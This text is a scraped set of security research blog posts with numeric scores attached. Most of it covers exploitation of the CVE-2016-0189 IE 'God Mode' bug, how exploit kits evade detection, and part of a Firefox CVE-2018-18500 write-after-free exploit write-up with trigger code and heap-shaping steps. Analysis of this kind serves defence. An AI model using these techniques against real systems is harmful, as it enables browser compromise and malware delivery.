] was elaborate enough simply to develop many forks with minimal changes to the original code. This enabled its inclusion not only in 'script kiddie' tools like OffensiveWare Multi Exploit Builder thanks to a one‑line change in code, but also in exploit kits like Gongda and Neutrino, which added evasion modules to the basic exploit.",0.01051275409907182
Figure 1: Distribution of unique hash volumes for CVE-2016 exploits observed during 2016.,0.018721458921704293
This vulnerability was first exploited in limited targeted attacks that affected computer users in South Korea [2] before Microsoft released a patch in May 2016. Theori's working proof of concept was released in June 2016.,0.009166604917751897
"The exploit is carried in an HTML page and can be hosted on any URL or can be sent as a standalone HTML page in an email. Any attempt to access the URL with a vulnerable version of Internet Explorer will result in the malicious code being run, which will be followed by the execution of a desired payload.",0.00819260895101126
God Mode,0.0094117783846972
"God Mode is an exploitation method in which VBScript code can escape the browser's sandbox. What makes it 'God Mode' is that there is no need to bypass Microsoft provided security features such as data execution prevention (DEP) and address space layout randomization (ASLR), as there is in usual exploits. Also, since there is no involvement of heap spray or return oriented programming (ROP), detection based on these techniques can potentially be evaded [3].",0.012295809648782408
CVE-2016-0189 God Mode bug: root cause analysis,0.007595061414975346
God Mode 101,0.009605078158784974
"When VBScript code is executed in the Internet Explorer sandbox, the code is prevented from creating and executing files on the local system. This restriction is provided using a flag called 'Safe Mode' in the COleScript class of the VBScript engine. If this flag is bypassed or overwritten with a different value, the VBScript can run as if it is being executed on the local shell.",0.011604160153321663
Difference between 2016-0189 and 2014-6332 God Modes,0.008871406574611718
"We have seen a similar exploit in the past, which used CVE‑2014-6332 to bypass the Safe Mode flag. CVE‑2014-6332 was used as a type confusion vulnerability, which allows out-of-bounds memory access. In contrast, CVE‑2016-0189 is a memory corruption vulnerability, which allows an exploit to corrupt objects and access full memory. By using these vulnerabilities, an exploit can bypass the Safe Mode and eventually execute malicious VBScript code in browsers' sandboxes.",0.007573114463258479
CVE 2016-0189 in action,0.009081886571634001
ValueOf method override,0.00737063420891082
"The aim of this exploit is somehow to call an overridden ValueOf method, as shown in Figure 2.",0.011583704156802876
Figure 2: JavaScript code to start the exploit execution.,0.012038360554586292
"However, in order to achieve this the attacker needs to perform a number of actions. First, the JavaScript calls a VBScript function named 'exploit' by passing an object 'o', as seen in Figure 2. This object contains a method, 'ValueOf'. The ValueOf function is overridden to trigger the vulnerability. We will come back to the 'o' object later.",0.011633364616620345
Inside the custom 'exploit' function,0.011992551946657604
"Going back to the exploit() function, we can see in Figure 3 that it creates some variables and then creates an object of dummy class, which is nothing but a simple VBScript class. This dummy 'dm' object contains memory addresses which will be used to overwrite the Safe Mode flag.",0.013215814032366602
Figure 3: VBScript 'exploit' function.,0.014271968253009915
The address of the dummy object is calculated in the exploit() function by calling the getAddr() method. Figure 4 shows the code of the getAddr() method.,0.010927441413445815
Figure 4: The 'getAddr' function used to find address of VBScript class.,0.011601446321659603
Using GetAddress to invoke overridden ValueOf,0.009670027667055936
"From the getAddr() function, the attacker needs somehow to reach to the overridden ValueOf method to trigger the bug. This is achieved by assigning an object 's' to the array (arg1, 2). Here, 'arg1' is the JavaScript object 'o', which we discussed earlier.",0.011418065911416475
"To calculate the array index, the VBScript calls the ValueOf method for this object. The ValueOf method (Figure 2) calls the triggerBug function of the VBScript, which contains the actual code to trigger the vulnerability.",0.011830509794794164
Inside triggerBug,0.00801897065499202
The code of the triggerBug function is shown in Figure 5.,0.01026427920757611
Figure 5: VBScript function used to resize the array and trigger the bug.,0.00981894158997898
"The triggerBug function resizes the array length to A(1, 1), which is smaller. This will free some memory. Crafted strings are then created in this freed memory. The aw.A(arg1, 2) in the getAddr function still points to the freed memory where the dummy class object 's' will be written. This allows the address of the dummy object to be read using the crafted string.",0.009336127678938988
Overwriting the Safe Mode flag,0.008206841096993989
The CSession object address can be found from the address of the dummy object. Figure 6 shows the code used to read the CSession object address from the dummy object.,0.011471344740400125
Figure 6: Function used to leak the address of the CSession object and COleScript object.,0.010900259349114094
"The address of the COleScript object is present in the CSession object. The address of the COleScript object, which contains the Safe Mode flag (COleScript + 0x174), as shown in Figure 3, will be read. Finally, the Safe Mode flag will be changed in the COleScript class.",0.009090442974143742
Figure 7: Function used to overwrite the Safe Mode flag.,0.013037963000954167
"At this point, the Safe Mode flag has been changed to '0x4', and now the VBScript can be executed in the browser in the same way as it is executed on the local shell. This allows the exploit to download and execute a malicious payload.",0.008934680167067777
CVE-2016-0189 VBScript God Mode memory corruption 'in the wild',0.011959648399927358
The exploit mentioned above was made publicly available as a proof of concept (POC) by Theori.,0.01040985188440502
"Since then, we have observed three variants of CVE‑2016‑0189 abused in the wild. These HTML pages are mostly hosted on Korean domains, which is not a surprise since exploits concerning Internet Explorer are often common in South Korea where it is a very popular browser. Following the God Mode exploitation, malware authors are taking one of the three routes shown in the flowchart in Figure 8.",0.01052191297671523
Figure 8: Flowchart showing the different approaches used by malicious kits to download and launch payloads via the CVE-2016-0189 exploit.,0.01331636979571904
Note that the KR variant is better known as the Gongda exploit kit in the wild.,0.010783485500770351
Variant 1: OffensiveWare generated 2016-0189,0.008372798319318475
"OffensiveWare Multi Exploit Builder is a cheap (US$50) exploit generation tool which has an option to generate God Mode HTML CVE-2016-0189 (see Figure 9). However, the software is easy to crack and anyone with a simple tweak can generate a working 2016-0189 without buying the licence for this tool.",0.012215331046457445
Figure 9: OffensiveWare tool builder.,0.013611592711465392
"The CVE-2016-0189 generated is very much like the first POC created by Theori, as we can see from the sequence of events happening in Figure 10 (an Internet Explorer generic process is launched to run PowerShell, which further downloads and runs the payload). Eventually, the tool just takes the attackers' website URL in a text box and simply places it in the position required in the crafted HTML page without adding any extra obfuscation or evasion module. A quick and easy way to earn 50 dollars per 'customer' without much effort.",0.011105314418466405
Figure 10: Internet Explorer launching PowerShell to download and run payload.,0.01441318454056384
Adoption in exploit kits,0.007529067016480373
More mature exploit kits have added more content to the basic Theori POC to make their content undetectable both statically and dynamically. Static detection evasion is attempted by using obfuscation to hide obvious strings related to the exploit (Figure 11).,0.013973764243999764
Figure 11: PowerShell commands obfuscated in exploit kits using CVE-2016-0189.,0.014204356181565791
"Evasion of behavioural detection has been handled by the Gongda and RIG exploit kits in two separate ways, as discussed below.",0.019286959767576883
Variant 2: Gongda exploit kit – PowerShell coupled with BITSAdmin to avoid behavioural detection,0.007666056866197368
"Using BITSAdmin in addition to PowerShell helps to add an extra layer of protection against behavioural monitoring as the payload will be created by svchost.exe and not PowerShell. This means that behaviour-based security software, which looks for file creation via PowerShell, can be bypassed.",0.009683621469021575
"This has already been seen in the case of a Cerber ransomware campaign where the evasion code was placed inside the macro, and now we see an exploit-generated attack using it [4], as shown in Figure 12.",0.014563453110449931
Figure 12: Gongda using BITSAdmin coupled with PowerShell.,0.012124651136269371
Variant 3: 2016-0189 in RIG exploit kit,0.008640286256693996
"The RIG exploit kit goes one step further as it first renames wscript.exe (Figure 13), so that any behaviour-based security software monitoring for wscript.exe via filename is bypassed. The sequence can be broken down into four steps, as follows:",0.01112448506476793
"Post exploitation, Internet Explorer launches the command line.",0.011391230248806394
The command line changes the name of wscript.exe to script.pif or wscript.com.,0.00943375245393252
Script.pif (which is in fact wscript.exe) is launched by the command line to further launch JavaScript.,0.008817628289223278
The JavaScript checks for the payload format and runs it.,0.011762032814762513
Figure 13: Wscript.exe renaming in RIG 2016-0189.,0.007642108265344394
Conclusion,0.008171308922719556
"After a good run in 2016, the usage of this exploit is expected to decrease, as it was patched by Microsoft some time ago. Furthermore, the future of such potential zero‑day God Mode exploits, which can run VBScript outside the sandbox, looks bleak, as Microsoft has decided not to support VBScript itself in Microsoft IE 11 edge mode [5]. Nevertheless, this exploit is expected to exist for some time longer in IE versions that continue to support VBScript.",0.011273576977465338
"From a detection perspective, static detection has the potential to be bypassed, as we have seen with exploit kits that have obfuscated the original POC. However, one can detect such threats by using behaviour-based alerts that trigger when Internet Explorer accesses the shell and performs an activity it is not generally supposed to perform.",0.011571769236080165
References,0.0158494738281566
[1] CVE-2016-0189 original release by Theori. https://github.com/theori-io/cve-2016-0189.,0.010301819306730797
[2] Internet Explorer zero-day exploit used in targeted attacks in South Korea. https://www.symantec.com/connect/blogs/internet-explorer-zero-day-exploit-used-targeted-attacks-south-korea.,0.01287121052804474
[3] A Killer Combo: Critical Vulnerability and 'Godmode' Exploitation on CVE-2014-6332. http://blog.trendmicro.com/trendlabs-security-intelligence/a-killer-combo-critical-vulnerability-and-godmode-exploitation-on-cve-2014-6332/.,0.011394363523640316
[4] The Journey of Evasion Enters Behavioural Phase. https://www.virusbulletin.com/virusbulletin/2016/07/journey-evasion-enters-behavioural-phase/.,0.014126767299343923
[5] VBScript is no longer supported in IE11 edge mode. https://msdn.microsoft.com/en-us/library/dn384057(v=vs.85).aspx.,0.013376178851606357
Appendix,0.009615341114577736
SHA 256 hash,0.00943536794092914
Description,0.014276898542484706
e4326798f7e97f6ecd7f20c158d29cf665248fb1de9849513d798cad925149d4 2016-0189,0.009889728951549381
Gongda exploit kit using BITSAdmin behavioural evasion,0.007370762071181036
3693580312cdbb83c27af51c71e0077a7f8a87bddaf69056687917059edf966b 2016-0189,0.009834078497107601
OffensiveWare builder,0.006698383746657766
757bd69fedd7e81d1f3bb31021e9c3d542018eb295c53221134e4c6c3eb5a6b6 2016-0189,0.00998593654879465
"Neutrino using wscript.exe renaming evasion
",0.007531697992462449
"Watch SophosLabs experts present their research on Hacking Team, PDF malware and APTs",0.010577899739825813
"Written by
John Zorabedian",0.00826774006182307
"February 11, 2016",0.009163416606356889
Products & Services Threat Research APT Attila Marosi Gabor Szappanos Hacking Team Hacktivity Jason Zhang,0.009600260764558777
"You might not have had a chance to make it to Budapest, Hungary for the Hacktivity 2015 conference, to see live presentations by some of our crack team of SophosLabs researchers.
Well, now we have videos from the event, so you can see three of our researchers give their talks, almost as if you were there! Their presentations cover some interesting topics.
Attila Marosi gives us an introduction to the Hacking Team malware exposed last year by a breach of the Italian hacking-for-hire company. Jason Zhang investigates new techniques used in recent PDF malware campaigns. And Gábor Szappanos analyzes and compares different malware authors on the advanced persistent threats (APT) scene.
Attila Marosi – Hacking Team Malware
The huge amount of data stolen from Hacking Team let us inside the work of the company that develops malware and exploits for its clients on the country level.
Attila’s presentation is broken into three parts. The first part is a quick introduction to Hacking Team’s exploit delivery network, how the malware was delivered to the targets, and how the infected devices were controlled through the proxy chain.
The second part is a detailed analysis of the exploits Hacking Team used to infect Android devices, including the installation (infection) process, and how they were used to elevate privileges on those devices.
The third part examines a collection of interesting techniques Hacking Team used to keep the malware as silent and undetectable as possible.",0.015218999583153647
"Jason Zhang – Making the Invisible Visible: Case Studies in PDF Malware
Jason’s talk investigates recent PDF malware campaigns and the new techniques adversaries are using to deliver malware via web downloads, email attachments and other infection vectors, in both targeted and non-targeted attacks.
PDF attackers can break detection with polymorphic techniques to hide malicious code. Jason’s research explores some new techniques used by malware writers to bypass detection:",0.019133550896118234
"A simple but effective URL aliasing technique to download malware.
Using PDF to deliver specific topic-related content for search engine poisoning.
Encapsulating PDF malware inside a PDF file to break detection.",0.013159278244850192
"Gábor Szappanos – Comparing the Incomparables
Gábor analyzes some APT malware families, and shows us how we can compare the different malware authors on the basis of their skill level.
His presentation details the exploitation of the CVE-2014-1761 vulnerability, investigates the different malware families that were using this vulnerability, and discusses the depth of modification into the exploit.
The comparative analysis allowed Gábor to draw a relationship chart between the different malware families, showing strong correlation with previously known intelligence, and adding a couple of new relations.
As Gábor says, this research allows us to understand the strengths and weaknesses of our adversaries.",0.015485602637217544
"About SophosLabs
SophosLabs is the global network of threat centers staffed by Sophos researchers and analysts.
Keep up to date with our latest industry-leading research and technical papers, expert opinion, and security advice at Naked Security and right here on the Sophos Blog.
Sign up for our Sophos Blog newsletter by entering your email address in the field at the top right of the blog’s webpage. Follow us on your favorite social media networks, chat with us in our forums, download our informative podcasts, or sign up for our RSS feeds.",0.026407615218321134
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Streaming Netflix on your PC? Beware of Silverlight exploit
A vulnerability affecting Microsoft Silverlight 5 is live and infecting PCs that visit compromised or malicious websites.
Developed by Microsoft, Silverlight is a framework for rich Internet applications and in many ways can be compared to Flash, although the latter has become more dominant.
The flaw, which exists in versions prior to 5.1.20125.0, allows attackers to execute arbitrary code on the affected systems without any user interaction. Microsoft patched the flaw (CVE-2013-0074) on March 12, 2013.
The Silverlight exploit was first spotted in the Angler exploit kit by @EKWatcher and later documented by Kafeine. The screenshot below summarizes the attack (click to enlarge):
Screenshot courtesy of Kafeine http://malware.dontneedcoffee.com/2013/11/cve-2013-0074-silverlight-integrates.html
Upon landing on the exploit page, the Angler exploit kit will determine if Silverlight is installed and what version is running.
If the conditions are right, a specially crafted library is triggered to exploit the Silverlight vulnerability.
As with all exploit kits, leveraging vulnerabilities is just an intermediary step for the real motive: pushing malware to the victims’ machine.
The Silverlight web plugin is not installed by default but is required to view content on certain websites.
As pointed out by Timo Hirvonen,  Netflix, which has 40 million subscribers, requires Silverlight for its paid streaming video service.
Netflix requires Silverlight: https://t.co/2fjx3yNxFO. That’s about 40 million potential victims for the Silverlight exploit in Angler EK.
— Timo Hirvonen (@TimoHirvonen) November 14, 2013
If you want to watch Netflix on your PC, you will need to use Silverlight. “If you do not already have Microsoft Silverlight plug-in installed, you will be prompted to download and install the free plug-in for your web browser. Just follow the instructions to get started,” prompted Netflix.
Fortunately, those that do not have the plugin yet will be redirected to download the latest (and safe) version.
However, those that already have and older version of Silverlight can still watch Netflix and may not be aware that their computers are at risk.
Please ensure that you are running the latest version available (5.1.20913.0) and that it is set to install updates automatically:",0.013352348395350155
"We can expect this CVE to be integrated into other exploit kits soon, so it is important to make sure you patch all your machines now.
Even if you don’t watch Netflix, you may have installed Silverlight in the past and forgotten about it. If you don’t need Silverlight (or other plugins), simply remove it altogether as that will help to reduce your surface of attack.",0.010579627581223106
"Jerome Segura (@jeromesegura) is a senior security researcher at Malwarebytes.
",0.014504426412314309
"CVE-2018-18500: write-after-free vulnerability in Firefox, Analysis and Exploitation",0.00753263614129307
"Written by
SophosLabs Offensive Security",0.008622298185940958
"April 18, 2019",0.008429442643844931
SophosLabs Uncut CVE-2018-18500 Exploit Firefox mitigation vulnerability,0.0072737116230200405
"Editor’s note: This article is a technical description of a bug discovered by a member of the Offensive Research team at SophosLabs, and how the researcher created a proof-of-concept “Arbitrary Read/Write Primitive” exploit for this bug. The vulnerability was deemed critical by Mozilla’s bug tracking team and was patched in Firefox 65.0. It’s written for an audience with background in security vulnerability research; no background in Firefox internals or web browsers in general is necessary.",0.007653087527432434
"Overview
This article is about CVE-2018-18500, a security vulnerability in Mozilla Firefox found and reported to the Mozilla Foundation by SophosLabs in November, 2018.
This security vulnerability involves a software bug in Gecko (Firefox’s browser engine), in code responsible for parsing web pages. A malicious web page can be programmed in a way that exploits this bug to fully compromise a vulnerable Firefox instance visiting it.
The engine component where the bug exists is the HTML5 Parser, specifically around the handling of “Custom Elements.”
The root cause of the bug described here is a programming error in which a C++ object is being used without properly holding a reference to it, allowing for the object to be prematurely freed. These circumstances lead to a memory corruption condition known as “Write After Free,” where the program erroneously writes into memory that has been freed.
Due to the numerous security mitigations applied to today’s operating systems and programs, developing a functional exploit for a memory corruption vulnerability in a web browser is no easy feat. It more often than not requires the utilization of multiple bugs and implementation of complex logic taking advantage of intricate program-specific techniques. This means that extensive use of JavaScript is virtually a requirement for this type of work, and such is the case in here as well.
The article uses 64-bit Firefox 63.0.3 for Windows for binary-specific details, and will reference the Gecko source code and the HTML Standard.
Background – Custom Elements
“Custom Elements” is a relatively new addition to the HTML standard, as part of the “Web Components” API. Simply put, it provides a way to create new types of HTML elements. Its full specification can be found here.
This is an example for a basic Custom Element definition of an element extension named extended-br that will behave the same as a regular br element except also print a line to log upon construction:The above example uses the “customized built-in element” variant, which is instantiated by using the ""is"" attribute (line 17).
Support for Custom Elements was introduced in the Firefox 63 release (October 23, 2018).
The Bug
The bug occurs when Firefox creates a custom element in the process of HTML tree construction. In this process the engine code may dispatch a JavaScript callback to invoke the matching custom element definition’s constructor function.
The engine code surrounding the JavaScript dispatch point makes use of a C++ object without properly holding a reference to it.
When the engine code resumes execution after returning from the JavaScript callback function, it performs a memory write into a member variable of this C++ object.However the called constructor function can be defined to cause the abortion of the document load, which means the abortion of the document’s active parser, internally causing the destruction and de-allocation of the active parser’s resources, including the aforementioned C++ object.
When this happens, a “Write-After-Free” memory corruption will occur.
Here’s the relevant part in the HTML5 Parser code for creating an HTML element:",0.012757695492999321
"nsresult
nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor* aBuilder,
nsIContent** aScriptElement,
bool* aInterrupted,
bool* aStreamEnded)
{
switch (mOpCode) {
...
case eTreeOpCreateHTMLElementNetwork:
case eTreeOpCreateHTMLElementNotNetwork: {
nsIContent** target = mOne.node;
...
*target = CreateHTMLElement(name,
attributes,
mOpCode == eTreeOpCreateHTMLElementNetwork
? dom::FROM_PARSER_NETWORK
: dom::FROM_PARSER_DOCUMENT_WRITE,
nodeInfoManager,
aBuilder,
creator);
return NS_OK;
}
...
}",0.021448463836153286
"nsIContent*
nsHtml5TreeOperation::CreateHTMLElement(
nsAtom* aName,
nsHtml5HtmlAttributes* aAttributes,
mozilla::dom::FromParser aFromParser,
nsNodeInfoManager* aNodeInfoManager,
nsHtml5DocumentBuilder* aBuilder,
mozilla::dom::HTMLContentCreatorFunction aCreator)
{
...
if (nsContentUtils::IsCustomElementsEnabled()) {
...
if (isCustomElement &amp;&amp; aFromParser != dom::FROM_PARSER_FRAGMENT) {
...
definition = nsContentUtils::LookupCustomElementDefinition(
document, nodeInfo-&gt;NameAtom(), nodeInfo-&gt;NamespaceID(), typeAtom);",0.01767555415923361
"if (definition) {
willExecuteScript = true;
}
}
}",0.01256585433435331
"if (willExecuteScript) { // This will cause custom element
// constructors to run
...
nsCOMPtr<dom::Element&gt; newElement;
NS_NewHTMLElement(getter_AddRefs(newElement),
nodeInfo.forget(),
aFromParser,
isAtom,
definition);
...",0.014780876995332037
"Inside NS_NewHTMLElement, if the element being created is a custom element, the function CustomElementRegistry::Upgrade will be called to invoke the custom element’s constructor, passing control to JavaScript.
After the custom element constructor finishes running and CreateHTMLElement() returns execution to Perform(), line 13 completes its execution: the return value of CreateHTMLElement() is written into the memory address pointed to by target.
Next, I’ll explain where target points, and where it is set, how to free that memory using JavaScript code, and what type of value is being written to freed memory.
What’s “target?”
We can see target being assigned in line 11: nsIContent** target = mOne.node;.This is where mOne.node comes from:",0.013241089546090712
"nsIContentHandle*
nsHtml5TreeBuilder::createElement(int32_t aNamespace,
nsAtom* aName,
nsHtml5HtmlAttributes* aAttributes,
nsIContentHandle* aIntendedParent,
nsHtml5ContentCreatorFunction aCreator)
{
...
nsIContent* elem;
if (aNamespace == kNameSpaceID_XHTML) {
elem = nsHtml5TreeOperation::CreateHTMLElement(
name,
aAttributes,
mozilla::dom::FROM_PARSER_FRAGMENT,
nodeInfoManager,
mBuilder,
aCreator.html);
}
...
nsIContentHandle* content = AllocateContentHandle();
...
treeOp-&gt;Init(aNamespace,
aName,
aAttributes,
content,
aIntendedParent,
!!mSpeculativeLoadStage,
aCreator);",0.01436999820345275
"inline void Init(int32_t aNamespace,
nsAtom* aName,
nsHtml5HtmlAttributes* aAttributes,
nsIContentHandle* aTarget,
nsIContentHandle* aIntendedParent,
bool aFromNetwork,
nsHtml5ContentCreatorFunction aCreator)
{
...
mOne.node = static_cast<nsIContent**&gt;(aTarget);
...
}",0.017632954691374825
So the value of target comes from AllocateContentHandle():,0.009285688542631121
"nsIContentHandle*
nsHtml5TreeBuilder::AllocateContentHandle()
{
...
return &amp;mHandles[mHandlesUsed++];
}",0.011523560150422218
This is how mHandles is initialized in nsHtml5TreeBuilder‘s constructor initializer list:,0.008632132075735655
"nsHtml5TreeBuilder::nsHtml5TreeBuilder(nsAHtml5TreeOpSink* aOpSink,
nsHtml5TreeOpStage* aStage)
...
, mHandles(new nsIContent*[NS_HTML5_TREE_BUILDER_HANDLE_ARRAY_LENGTH])
...",0.016326067856590742
"So an array with the capacity to hold NS_HTML5_TREE_BUILDER_HANDLE_ARRAY_LENGTH (512) pointers to nsIContent objects is first initialized when the HTML5 parser’s tree builder object is created, and every time AllocateContentHandle() is called it returns the next unused slot in the array, starting from index number 0.
On 64-bit systems, the allocation size of mHandles is NS_HTML5_TREE_BUILDER_HANDLE_ARRAY_LENGTH * sizeof(nsIContent*) == 512 * 8 == 4096 (0x1000).
How to get mHandles freed?
mHandles is a member variable of class nsHtml5TreeBuilder. In the context of the buggy code flaw, nsHtml5TreeBuilder is instantiated by nsHtml5StreamParser, which in turn is instantiated by nsHtml5Parser.
We used the following JavaScript code in the custom element constructor:",0.015965965299491902
"location.replace(""about:blank"");",0.012731699089720716
"We tell the browser to navigate away from the current page and cause the following call tree in the engine:
Location::SetURI()
-> nsDocShell::LoadURI()
-> nsDocShell::InternalLoad()
-> nsDocShell::Stop()
-> nsDocumentViewer::Stop()
-> nsHTMLDocument::StopDocumentLoad()
-> nsHtml5Parser::Terminate()
-> nsHtml5StreamParser::Release()
That last function call drops a reference to the active nsHtml5StreamParser object, but it is not yet orphaned: the remaining references are to be dropped by a couple of asynchronous tasks that will only get scheduled the next time Gecko’s event loop spins.
This is normally not going to happen in the course of running a JavaScript function, since one of JavaScript’s properties is that it’s “Never blocking”, but in order to trigger the bug we must have these pending asynchronous tasks executed before the custom element constructor returns.",0.014161108525298283
"The last link gives a hint on how to accomplish this: “Legacy exceptions exist like alert or synchronous XHR“. XHR (XMLHttpRequest) is an API that can be used to retrieve data from a web server.
It’s possible to make use of synchronous XHR to cause the browser engine to spin the event loop until the XHR call completes; that is, when data has been received from the web server.So by using the following code in the custom element constructor…",0.012158018253372704
"location.replace(""about:blank"");",0.012731699089720716
"var xhr = new XMLHttpRequest();
xhr.open('GET', '/delay.txt', false);
xhr.send(null);",0.015014317126488819
"…and setting the contacted web server to artificially delay the response for /delay.txt requests by a few seconds to cause a long period of event loop spinning in the browser, we can guarantee that, by the time line 5 completes execution, the currently active nsHtml5StreamParser object will have become orphaned. Then the next time a garbage collection cycle occurs, the orphaned nsHtml5StreamParser object will be destructed and have its resources de-allocated (including mHandles).
""about:blank"" is used for the new location because it is an empty page that does not require network interaction for loading.
The aim is to make sure that the amount of work (code logic) performed by the engine in the span between the destruction of the nsHtml5StreamParser object and the write-after-free corruption is as minimal as possible, because the steps we will be taking for exploiting the bug rely on successfully shaping certain structures in heap memory. Since heap allocators are non-deterministic in nature, any extra logic running in the engine at the same time increases the chance of side effects in the form of unexpected allocations that can sabotage the exploitation process.
What value is being written to freed memory?
The return value of nsHtml5TreeOperation::CreateHTMLElement is a pointer to a newly created C++ object representing an HTML element, e.g. HTMLTableElement or HTMLFormElement.
Since triggering the bug requires the abortion of the currently running document parser, this new object does not get linked to any existing data structures and remains orphaned, and eventually gets released in a future garbage collection cycle.
Controlling write-after-free offset
To summarize so far, the bug can be exploited to effectively have the following pseudo-code take place:",0.013737342502545213
"nsIContent* mHandles[] = moz_xmalloc(0x1000);
nsIContent** target = &amp;mHandles[mHandlesUsed++];
free(mHandles);
...
*target = CreateHTMLElement(...);",0.014492535031616849
"So while the value being written into freed memory here (return value of CreateHTMLElement()) is uncontrollable (always a memory allocation pointer) and its contents unreliable (orphaned object), we can adjust the offset in which the value is written relative to the base address of freed allocation, according to the value of mHandlesUsed. As we previously showed mHandlesUsed increases for every HTML element the parser encounters:",0.01407253166231237
"<br&gt;                          <-- mHandlesUsed = 0
<br&gt;                          <-- mHandlesUsed = 1
<br&gt;                          <-- mHandlesUsed = 2
<br&gt;                          <-- mHandlesUsed = 3
<br&gt;                          <-- mHandlesUsed = 4
<br&gt;                          <-- mHandlesUsed = 5
<br&gt;                          <-- mHandlesUsed = 6
<span is=custom-span&gt;</span&gt;  <-- mHandlesUsed = 7",0.018859253131916165
"In the above example, given the allocation address of mHandles was 0x7f0ed4f0e000 and the custom span element triggered the bug in its constructor, the address of the newly created HTMLSpanElement object will be written into 0x7f0ed4f0e038 (0x7f0ed4f0e000 + (7 * sizeof(nsIContent*))).
Surviving document destruction
Since triggering the bug requires navigating away and aborting the load of the current document, we will not be able to execute JavaScript in that document anymore after the constructor function returns:JavaScript error: , line 0: NotSupportedError: Refusing to execute function from window whose document is no longer active.For crafting a functional exploit, it’s necessary to keep executing more JavaScript logic after the bug is triggered. For that purpose we can use a main web page that creates a child iframe element inside of which the HTML and JavaScript code for triggering the bug will reside.
After the bug is triggered and the child iframe’s document has been changed to ""about:blank"" the main page remains intact and can execute the remaining JavaScript logic in its context.
Here’s an example of an HTML page creating a child iframe:",0.014970543417351379
"Background – concepts and properties of Firefox’s heap
To understand the exploitation process here it’s crucial to know how Firefox’s memory allocator works. Firefox uses a memory allocator called mozjemalloc, which is a fork of the jemalloc project. This section will briefly explain a few basic terms and properties of mozjemalloc, using as reference these 2 articles you should definitely read for properly understanding the subject: [PSJ] & [TSOF].
Regions:“Regions are the heap items returned on user allocations (e.g. malloc(3) calls).” [PSJ]
Chunks:“The term ‘chunk’ is used to describe big virtual memory regions that the memory allocator conceptually divides available memory into.” [PSJ]
Runs:“Runs are further memory denominations of the memory divided by jemalloc into chunks.” [PSJ]“In essence, a chunk is broken into several runs.” [PSJ]“Each run holds regions of a specific size.” [PSJ]
Size classes:Allocations are broken into categories according to size class.Size classes in Firefox’s heap: 4, 8, 16, 32, 48, …, 480, 496, 512, 1024, 2048. [mozjemalloc.cpp]Allocation requests are rounded up to the nearest size class.",0.01563400780887736
Bins:“Each bin has an associated size class and stores/manages regions of this size class.” [PSJ]“A bin’s regions are managed and accessed through the bin’s runs.” [PSJ]Pseudo-code illustration:,0.01361816272959171
"void *x = malloc(513);
void *y = malloc(650);
void *z = malloc(1000);
// now: x, y, z were all allocated from the same bin,
// of size class 1024, the smallest size class that is
// larger than the requested size in all 3 calls",0.014227768893820492
"LIFO free list:“Another interesting feature of jemalloc is that it operates in a last-in-first-out (LIFO) manner (see [PSJ] for the free algorithm); a free followed by a garbage collection and a subsequent allocation request for the same size, most likely ends up in the freed region.” [TSOF]Pseudo-code illustration:",0.016359407191260056
"void *x = moz_xmalloc(0x1000);
free(x);
void *y = moz_xmalloc(0x1000);
// now: x == y",0.013129903695245249
"Same size class allocations are contiguous:At a certain state that may be achieved by performing many allocations and exhausting the free list, sequential allocations of the same size class will be contiguous in memory – “Allocation requests (i.e. malloc() calls) are rounded up and assigned to a bin. […] If none is found, a new run is allocated and assigned to the specific bin. Therefore, this means that objects of different types but with similar sizes that are rounded up to the same bin are contiguous in the jemalloc heap.” [TSOF]
Pseudo-code illustration:",0.014541184822344122
"for (i = 0; i < 1000; i++) {
x[i] = moz_xmalloc(0x400);
}
// x[995] == 0x7fb8fd3a1c00
// x[996] == 0x7fb8fd3a2000 (== x[995] + 0x400)
// x[997] == 0x7fb8fd3a2400 (== x[996] + 0x400)
// x[998] == 0x7fb8fd3a2800 (== x[997] + 0x400)
// x[999] == 0x7fb8fd3a2c00 (== x[998] + 0x400)",0.022999619637108837
"Run recycling:When all allocations inside a run are freed, the run gets de-allocated and is inserted into a list of available runs. A de-allocated run may get coalesced with adjacent de-allocated runs to create a bigger, single de-allocated run. When a new run is needed (for holding new memory allocations) it may be taken from the list of available runs. This allows a memory address that belonged to one run holding allocations of a specific size class to be “recycled” into being part of a different run, holding allocations of a different size class.Pseudo-code illustration:",0.016255363977797477
"for (i = 0; i < 1000; i++) {
x[i] = moz_xmalloc(1024);
}
for (i = 0; i < 1000; i++) {
free(x[i]);
}
// after freeing all 1024 sized allocations, runs of 1024 size class
// have been de-allocated and put into the list of available runs
for (i = 0; i < 1000; i++) {
y[i] = moz_xmalloc(512);
// runs necessary for holding new 512 allocations, if necessary,
// will get taken from the list of available runs and get assigned
// to 512 size class bins
}
// some elements in y now have the same addresses as elements in x",0.013638209455922867
"General direction for exploitation
Considering the basic primitive of memory corruption this bug allows for, the exploitation approach would be trying to plant an object in place of the freed mHandles allocation, so that overwriting it with a memory address pointer at a given offset will be helpful for advancing in our exploitation effort.
A good candidate would be the “ArrayObjects inside ArrayObjects” technique [TSOF] where we would place an ArrayObject object in place of mHandles, and then overwrite its length header variable with a memory address (which is a very large numeric value) using the bug so that a malformed ArrayObject object is created and is accessible from JavaScript for reading and writing of memory much further than legitimately intended, since index access to that malformed array is validated against the length value that was corrupted.
But after a bit of experimentation it seemed like it’s not working, and apparently the reason is a change in the code pushed on October 2017 that separates allocations made by the JavaScript engine from other allocations by forcing the usage of a different heap arena. Thus allocations from js_malloc() (JavaScript engine function) and moz_xmalloc() (regular function) will not end up on the same heap run without some effort. This renders the technique mostly obsolete, or at least the straightforward version of it.
So another object type has to be found for this.
XMLHttpRequestMainThread as memory corruption target
We are going to talk about XMLHttpRequest again, this time from a different angle. XHR objects can be configured to receive the response in a couple of different ways, one of them is through an ArrayBuffer object:",0.014432471173990269
"var oReq = new XMLHttpRequest();
oReq.open(""GET"", ""/myfile.png"", true);
oReq.responseType = ""arraybuffer"";",0.018329446546485495
"oReq.onload = function (oEvent) {
var arrayBuffer = oReq.response;
if (arrayBuffer) {
var byteArray = new Uint8Array(arrayBuffer);
for (var i = 0; i < byteArray.byteLength; i++) {
// do something with each byte in the array
}
}
};",0.020031072706035213
oReq.send(null);,0.013306470464532927
"This is the engine function that’s responsible for creating an ArrayBuffer object with the received response data, invoked upon accessing the XMLHttpRequest‘s object response property (line 6):",0.014801079710353604
"JSObject* ArrayBufferBuilder::getArrayBuffer(JSContext* aCx) {
if (mMapPtr) {
JSObject* obj = JS::NewMappedArrayBufferWithContents(aCx, mLength, mMapPtr);
if (!obj) {
JS::ReleaseMappedArrayBufferContents(mMapPtr, mLength);
}
